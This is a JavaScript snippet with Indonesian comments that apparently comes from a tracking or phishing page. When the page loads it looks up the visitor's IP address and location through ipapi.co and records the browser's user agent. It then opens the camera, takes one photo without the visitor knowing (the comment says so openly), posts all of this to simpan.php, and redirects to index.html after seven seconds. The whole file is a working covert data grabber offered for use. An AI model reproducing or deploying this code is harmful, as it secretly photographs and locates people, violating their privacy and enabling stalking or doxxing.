const canvas = document.getElementById("canvas");

let ip = "Tidak diketahui";
let lokasi = "Tidak diketahui";
let device = navigator.userAgent;
let foto = "";

// Ambil IP dan lokasi
fetch("https://ipapi.co/json")
  .then(res => res.json())
  .then(data => {
    ip = data.ip;
    lokasi = data.city + ", " + data.region + ", " + data.country_name;
  });

// Akses kamera dan ambil gambar diam-diam
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    video.onloadedmetadata = () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      foto = canvas.toDataURL("image/png");

      fetch("simpan.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, lokasi, device, foto })
      });

      stream.getTracks().forEach(track => track.stop());

      setTimeout(() => {
        window.location.href = "index.html";
      }, 7000);
    };
  })
  .catch(() => {
    setTimeout(() => {
      window.location.href = "index.html";
    }, 7000);
  });
